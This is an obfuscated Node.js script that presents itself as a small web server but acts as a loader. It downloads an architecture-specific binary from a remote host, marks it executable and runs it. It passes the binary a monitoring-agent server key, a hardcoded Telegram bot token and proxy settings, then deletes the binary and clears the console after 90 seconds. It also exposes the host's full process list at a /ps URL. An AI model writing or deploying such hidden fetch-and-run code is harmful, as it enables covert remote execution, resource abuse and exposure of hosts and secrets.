#!/usr/bin/env node

const _0x503571 = _0x11a8
;(function (_0xe4d0b0, _0x34634d) {
  const _0x4a6db4 = {
      _0x2b371: 0x1c5,
      _0xf8cbf9: 0x179,
      _0x483eb2: 0x17d,
      _0x2981a0: 0x1b2,
      _0x3719e9: 0x1a9,
      _0x8675ee: 0x1cf,
      _0x35c05f: 0x186,
      _0x4289f4: 0x18d,
      _0x3546c7: 0x1c2
    },
    _0x360d71 = _0x11a8,
    _0xc7f133 = _0xe4d0b0()
  while (!![]) {
    try {
      const _0x545bf0 =
        (-parseInt(_0x360d71(_0x4a6db4._0x2b371)) / 0x1) * (-parseInt(_0x360d71(_0x4a6db4._0xf8cbf9)) / 0x2) +
        (-parseInt(_0x360d71(0x1a5)) / 0x3) * (-parseInt(_0x360d71(_0x4a6db4._0x483eb2)) / 0x4) +
        parseInt(_0x360d71(0x182)) / 0x5 +
        (parseInt(_0x360d71(_0x4a6db4._0x2981a0)) / 0x6) * (parseInt(_0x360d71(0x192)) / 0x7) +
        (parseInt(_0x360d71(_0x4a6db4._0x3719e9)) / 0x8) * (parseInt(_0x360d71(0x1c4)) / 0x9) +
        (parseInt(_0x360d71(_0x4a6db4._0x8675ee)) / 0xa) * (-parseInt(_0x360d71(_0x4a6db4._0x35c05f)) / 0xb) +
        (-parseInt(_0x360d71(_0x4a6db4._0x4289f4)) / 0xc) * (parseInt(_0x360d71(_0x4a6db4._0x3546c7)) / 0xd)
      if (_0x545bf0 === _0x34634d) break
      else _0xc7f133['push'](_0xc7f133['shift']())
    } catch (_0x54861e) {
      _0xc7f133['push'](_0xc7f133['shift']())
    }
  }
})(_0x19fd, 0x94e81)
const fs = require('fs'),
  os = require('os'),
  path = require(_0x503571(0x1a2)),
  https = require(_0x503571(0x1a7)),
  http = require(_0x503571(0x1bd))
process[_0x503571(0x1ce)] = !![]
const { spawn, execSync } = require(_0x503571(0x1bf)),
  PORT = process[_0x503571(0x197)][_0x503571(0x181)] || 0xbb8,
  SUB_PATH = process[_0x503571(0x197)][_0x503571(0x1b4)] || _0x503571(0x198),
  config = {
    NAME: process['env'][_0x503571(0x1aa)] || _0x503571(0x1c9),
    CFIP: process[_0x503571(0x197)][_0x503571(0x17a)] || _0x503571(0x19d),
    CFPORT: process[_0x503571(0x197)]['CFPORT'] || 0x1bb,
    UPLOAD_URL: process[_0x503571(0x197)]['UPLOAD_URL'] || '',
    FILE_PATH: process[_0x503571(0x197)][_0x503571(0x1ad)] || _0x503571(0x1d5),
    NEZHA_SERVER: process[_0x503571(0x197)][_0x503571(0x196)] || _0x503571(0x1af),
    NEZHA_PORT: process[_0x503571(0x197)][_0x503571(0x180)] || '',
    NEZHA_KEY: process[_0x503571(0x197)][_0x503571(0x176)] || _0x503571(0x1b5),
    UUID: process[_0x503571(0x197)][_0x503571(0x1ba)] || _0x503571(0x17c),
    DISABLE_ARGO: process['env'][_0x503571(0x1d2)] || _0x503571(0x19c),
    ARGO_AUTH: process['env'][_0x503571(0x19b)] || '',
    ARGO_DOMAIN: process[_0x503571(0x197)][_0x503571(0x183)] || '',
    ARGO_PORT: process['env'][_0x503571(0x1c7)] || _0x503571(0x1ca),
    S5_PORT: process[_0x503571(0x197)]['S5_PORT'] || '',
    HY2_PORT: process[_0x503571(0x197)]['HY2_PORT'] || _0x503571(0x1d4),
    TUIC_PORT: process[_0x503571(0x197)][_0x503571(0x1c8)] || '',
    ANYTLS_PORT: process[_0x503571(0x197)]['ANYTLS_PORT'] || '',
    REALITY_PORT: process['env'][_0x503571(0x190)] || '57352',
    ANYREALITY_PORT: process[_0x503571(0x197)][_0x503571(0x188)] || '',
    CHAT_ID: process['env'][_0x503571(0x1a8)] || '7575949494',
    BOT_TOKEN: process[_0x503571(0x197)]['BOT_TOKEN'] || '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
    SHOW_LOG: process['env'][_0x503571(0x1ab)] || _0x503571(0x1d3)
  }
function log(_0x13c667, _0x21e8ef = 'INFO') {
  const _0x4c3e01 = { _0x282418: 0x1a4, _0xb3c66d: 0x1d1 },
    _0x42333a = _0x503571,
    _0x4be255 = new Date()['toLocaleTimeString']()
  console[_0x42333a(_0x4c3e01._0x282418)]('[' + _0x4be255 + _0x42333a(_0x4c3e01._0xb3c66d) + _0x21e8ef + ']\x20' + _0x13c667)
}
function getArchitecture() {
  const _0x1363dc = { _0x2f0024: 0x1db, _0x35b5b1: 0x1b3 },
    _0x85583c = _0x503571,
    _0x178f70 = os[_0x85583c(0x1a6)](),
    _0x5586db = os['platform']()
  log(_0x85583c(0x18f) + _0x5586db + _0x85583c(0x177) + _0x178f70)
  if (_0x5586db === _0x85583c(0x184) || _0x5586db === _0x85583c(0x1b6)) {
    if (_0x178f70 === _0x85583c(0x1b1) || _0x178f70 === 'amd64') return 'amd64'
    else {
      if (_0x178f70 === 'arm64' || _0x178f70 === _0x85583c(0x1d9)) return _0x85583c(0x1c0)
    }
  }
  return (log(_0x85583c(_0x1363dc._0x2f0024), _0x85583c(0x191)), _0x85583c(_0x1363dc._0x35b5b1))
}
function _0x19fd() {
  const _0x599048 = [
    'https',
    'CHAT_ID',
    '64dOencG',
    'NAME',
    'SHOW_LOG',
    'Internal\x20Server\x20Error',
    'FILE_PATH',
    'CFPORT',
    'nezha.933993.xyz:443',
    'readFileSync',
    'x64',
    '18utXNkn',
    'amd64',
    'SUB_PATH',
    '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
    'darwin',
    'https://amd64.eooce.com/sbsh',
    'HY2_PORT',
    'end',
    'UUID',
    'ERROR',
    'statusCode',
    'http',
    'utf8',
    'child_process',
    'arm64',
    '/ps',
    '793OtYTOj',
    'Download\x20failed,\x20status:\x20',
    '351657ytsauh',
    '27186iuPfIU',
    'inherit',
    'ARGO_PORT',
    'TUIC_PORT',
    'js-node',
    '58081',
    'unlink',
    'S5_PORT',
    'existsSync',
    'noDeprecation',
    '50vWLlPf',
    'pipe',
    ']\x20[',
    'DISABLE_ARGO',
    'false',
    '57352',
    '.npm',
    'clear',
    'error',
    'Starting\x20application...',
    'aarch64',
    'url',
    'Unknown\x20architecture,\x20defaulting\x20to\x20amd64',
    'NEZHA_KEY',
    ',\x20Arch:\x20',
    'unlinkSync',
    '20Irauev',
    'CFIP',
    'message',
    'e18d5155-c6c5-4e81-aa89-09e204fd07d4',
    '68Yqolcn',
    'cwd',
    'text/plain',
    'NEZHA_PORT',
    'PORT',
    '1602055ZKfNkK',
    'ARGO_DOMAIN',
    'linux',
    'sub.txt\x20not\x20found\x20yet.',
    '17479nqRegd',
    'Error:\x20',
    'ANYREALITY_PORT',
    'listen',
    'SIGINT',
    'get',
    'Shutting\x20down...',
    '309012EnmzQj',
    'writeHead',
    'Platform:\x20',
    'REALITY_PORT',
    'WARN',
    '660289LFcoMT',
    '🌐\x20HTTP:\x20http://localhost:',
    'sub.txt',
    'exit',
    'NEZHA_SERVER',
    'env',
    '800',
    'ANYTLS_PORT',
    '0.0.0.0',
    'ARGO_AUTH',
    'true',
    'mfa.gov.ua',
    'BOT_TOKEN',
    'join',
    'disbot',
    'createServer',
    'path',
    'https://arm64.eooce.com/sbsh',
    'log',
    '176619ZaRLYv',
    'arch'
  ]
  _0x19fd = function () {
    return _0x599048
  }
  return _0x19fd()
}
function downloadFile(_0x45f15e, _0x234e96) {
  const _0x4fb8c3 = { _0x3e3259: 0x18b }
  return new Promise((_0x2f3249, _0x51604a) => {
    const _0x373465 = _0x11a8,
      _0x5b0676 = fs['createWriteStream'](_0x234e96)
    https[_0x373465(_0x4fb8c3._0x3e3259)](_0x45f15e, (_0x4d7f2b) => {
      const _0xa5d81d = _0x373465
      if (_0x4d7f2b['statusCode'] !== 0xc8) {
        _0x51604a(new Error(_0xa5d81d(0x1c3) + _0x4d7f2b[_0xa5d81d(0x1bc)]))
        return
      }
      ;(_0x4d7f2b[_0xa5d81d(0x1d0)](_0x5b0676),
        _0x5b0676['on']('finish', () => {
          ;(_0x5b0676['close'](), _0x2f3249())
        }))
    })['on']('error', (_0x1833ff) => {
      const _0x663dd4 = _0x373465
      ;(fs[_0x663dd4(0x1cb)](_0x234e96, () => {}), _0x51604a(_0x1833ff))
    })
  })
}
const server = http[_0x503571(0x1a1)](async (_0x2a9660, _0x3f697c) => {
  const _0xfa933e = {
      _0x34f9aa: 0x1da,
      _0x33055d: 0x1cd,
      _0xb88138: 0x1b0,
      _0x23a2a7: 0x18e,
      _0x505e8b: 0x1b9,
      _0x1efec4: 0x1b9,
      _0x5631dd: 0x19f,
      _0x355eaf: 0x1ad,
      _0x47b670: 0x194,
      _0x446713: 0x17f,
      _0x3b06b2: 0x1b9,
      _0x24e238: 0x1c1,
      _0x2e0637: 0x1be,
      _0x9524d8: 0x18e,
      _0x342ed6: 0x1ac
    },
    _0x224346 = _0x503571
  try {
    if (_0x2a9660[_0x224346(_0xfa933e._0x34f9aa)] === '/') {
      const _0x362d13 = path['join'](__dirname, 'index.html')
      if (fs[_0x224346(_0xfa933e._0x33055d)](_0x362d13)) {
        const _0x57d585 = fs[_0x224346(_0xfa933e._0xb88138)](_0x362d13, _0x224346(0x1be))
        ;(_0x3f697c[_0x224346(_0xfa933e._0x23a2a7)](0xc8, { 'Content-Type': 'text/html' }), _0x3f697c[_0x224346(_0xfa933e._0x505e8b)](_0x57d585))
      } else
        (_0x3f697c['writeHead'](0xc8, { 'Content-Type': 'text/html' }),
          _0x3f697c[_0x224346(_0xfa933e._0x1efec4)](
            '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Server\x20is\x20Running</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20'
          ))
    } else {
      if (_0x2a9660[_0x224346(0x1da)] === '/' + SUB_PATH) {
        const _0x104888 = path[_0x224346(_0xfa933e._0x5631dd)](config[_0x224346(_0xfa933e._0x355eaf)], _0x224346(_0xfa933e._0x47b670))
        if (fs['existsSync'](_0x104888)) {
          const _0x4fd90b = fs[_0x224346(_0xfa933e._0xb88138)](_0x104888, _0x224346(0x1be))
          ;(_0x3f697c[_0x224346(0x18e)](0xc8, { 'Content-Type': _0x224346(_0xfa933e._0x446713) }),
            _0x3f697c[_0x224346(_0xfa933e._0x3b06b2)](_0x4fd90b))
        } else (_0x3f697c[_0x224346(0x18e)](0x194), _0x3f697c[_0x224346(0x1b9)](_0x224346(0x185)))
      } else {
        if (_0x2a9660['url'] === _0x224346(_0xfa933e._0x24e238))
          try {
            const _0x20c475 = execSync('ps\x20aux', { encoding: _0x224346(_0xfa933e._0x2e0637), maxBuffer: 0x400 * 0x400 })
            ;(_0x3f697c['writeHead'](0xc8, { 'Content-Type': 'text/plain' }), _0x3f697c['end'](_0x20c475))
          } catch (_0x42ef73) {
            ;(_0x3f697c[_0x224346(_0xfa933e._0x23a2a7)](0x1f4), _0x3f697c[_0x224346(0x1b9)]('Error:\x20' + _0x42ef73[_0x224346(0x17b)]))
          }
        else (_0x3f697c[_0x224346(_0xfa933e._0x9524d8)](0x194), _0x3f697c['end']('404\x20Not\x20Found'))
      }
    }
  } catch (_0x53790b) {
    ;(_0x3f697c[_0x224346(0x18e)](0x1f4), _0x3f697c[_0x224346(0x1b9)](_0x224346(_0xfa933e._0x342ed6)))
  }
})
function _0x11a8(_0x14163c, _0x33c32b) {
  const _0x19fd26 = _0x19fd()
  return (
    (_0x11a8 = function (_0x11a8b2, _0x13a482) {
      _0x11a8b2 = _0x11a8b2 - 0x176
      let _0x5b558c = _0x19fd26[_0x11a8b2]
      return _0x5b558c
    }),
    _0x11a8(_0x14163c, _0x33c32b)
  )
}
async function main() {
  const _0x23dcf8 = {
      _0xc24b0d: 0x1d8,
      _0x1afc3b: 0x1ad,
      _0x436aea: 0x1b7,
      _0x55ec9f: 0x19f,
      _0x24baee: 0x17e,
      _0x577ae4: 0x197,
      _0x1193bb: 0x180,
      _0x12ecfa: 0x176,
      _0x2528ce: 0x183,
      _0x11e726: 0x19b,
      _0x142bea: 0x17a,
      _0x31e11e: 0x1c7,
      _0x300be9: 0x1cc,
      _0x274ab9: 0x1b8,
      _0x41382e: 0x1c8,
      _0x1c0842: 0x199,
      _0x2c3170: 0x188,
      _0xa60ec9: 0x19e,
      _0x530966: 0x1d2,
      _0x43eeca: 0x1c6,
      _0x208d32: 0x187,
      _0x240396: 0x17b,
      _0x19cfcd: 0x1cd,
      _0x3f93c8: 0x195
    },
    _0x195781 = { _0x1225d6: 0x1cd },
    _0x1cc4d6 = { _0x3f9cb6: 0x1bb },
    _0x4d63d7 = _0x503571
  log(_0x4d63d7(_0x23dcf8._0xc24b0d))
  let _0x59938b = '',
    _0xfaa462 = null
  try {
    fs['mkdirSync'](config[_0x4d63d7(_0x23dcf8._0x1afc3b)], { recursive: !![] })
    const _0xda520a = getArchitecture(),
      _0x127f6d = _0xda520a === _0x4d63d7(0x1b3) ? _0x4d63d7(_0x23dcf8._0x436aea) : _0x4d63d7(0x1a3)
    ;((_0x59938b = path[_0x4d63d7(_0x23dcf8._0x55ec9f)](process[_0x4d63d7(_0x23dcf8._0x24baee)](), _0x4d63d7(0x1a0))),
      await downloadFile(_0x127f6d, _0x59938b),
      fs['chmodSync'](_0x59938b, 0x1ed))
    const _0x54cb45 = {
      ...process[_0x4d63d7(_0x23dcf8._0x577ae4)],
      UUID: config[_0x4d63d7(0x1ba)],
      NEZHA_SERVER: config['NEZHA_SERVER'],
      NEZHA_PORT: config[_0x4d63d7(_0x23dcf8._0x1193bb)],
      NEZHA_KEY: config[_0x4d63d7(_0x23dcf8._0x12ecfa)],
      ARGO_DOMAIN: config[_0x4d63d7(_0x23dcf8._0x2528ce)],
      ARGO_AUTH: config[_0x4d63d7(_0x23dcf8._0x11e726)],
      CFIP: config[_0x4d63d7(_0x23dcf8._0x142bea)],
      CFPORT: config[_0x4d63d7(0x1ae)],
      NAME: config[_0x4d63d7(0x1aa)],
      FILE_PATH: config[_0x4d63d7(_0x23dcf8._0x1afc3b)],
      ARGO_PORT: config[_0x4d63d7(_0x23dcf8._0x31e11e)],
      S5_PORT: config[_0x4d63d7(_0x23dcf8._0x300be9)],
      HY2_PORT: config[_0x4d63d7(_0x23dcf8._0x274ab9)],
      TUIC_PORT: config[_0x4d63d7(_0x23dcf8._0x41382e)],
      ANYTLS_PORT: config[_0x4d63d7(_0x23dcf8._0x1c0842)],
      REALITY_PORT: config['REALITY_PORT'],
      ANYREALITY_PORT: config[_0x4d63d7(_0x23dcf8._0x2c3170)],
      CHAT_ID: config['CHAT_ID'],
      BOT_TOKEN: config[_0x4d63d7(_0x23dcf8._0xa60ec9)],
      UPLOAD_URL: config['UPLOAD_URL'],
      DISABLE_ARGO: config[_0x4d63d7(_0x23dcf8._0x530966)]
    }
    ;((_0xfaa462 = spawn(_0x59938b, [], { env: _0x54cb45, stdio: _0x4d63d7(_0x23dcf8._0x43eeca) })),
      _0xfaa462['on'](_0x4d63d7(0x1d7), (_0x2222d5) => {
        const _0x4f5e8d = _0x4d63d7
        log('Process\x20error:\x20' + _0x2222d5['message'], _0x4f5e8d(_0x1cc4d6._0x3f9cb6))
      }),
      _0xfaa462['on']('exit', (_0x4d2f07) => {
        ;(log('Logs\x20will\x20be\x20cleared\x20in\x2090\x20seconds,you\x20can\x20copy\x20the\x20above\x20nodes'),
          setTimeout(() => {
            const _0x54ed8b = _0x11a8
            fs[_0x54ed8b(0x1cd)](_0x59938b) && (fs[_0x54ed8b(0x178)](_0x59938b), console[_0x54ed8b(0x1d6)](), log('✅\x20App\x20is\x20running'))
          }, 0x15f90))
      }),
      log(_0x4d63d7(0x193) + PORT),
      process['on'](_0x4d63d7(0x18a), () => {
        const _0x41379b = _0x4d63d7
        log(_0x41379b(0x18c))
        if (_0xfaa462) _0xfaa462['kill']()
        if (fs[_0x41379b(_0x195781._0x1225d6)](_0x59938b)) fs[_0x41379b(0x178)](_0x59938b)
        process['exit'](0x0)
      }))
  } catch (_0x38edcc) {
    ;(log(_0x4d63d7(_0x23dcf8._0x208d32) + _0x38edcc[_0x4d63d7(_0x23dcf8._0x240396)], _0x4d63d7(0x1bb)),
      fs[_0x4d63d7(_0x23dcf8._0x19cfcd)](_0x59938b) && fs[_0x4d63d7(0x178)](_0x59938b),
      process[_0x4d63d7(_0x23dcf8._0x3f93c8)](0x1))
  }
}
;(server[_0x503571(0x189)](PORT, _0x503571(0x19a), () => {}), main())
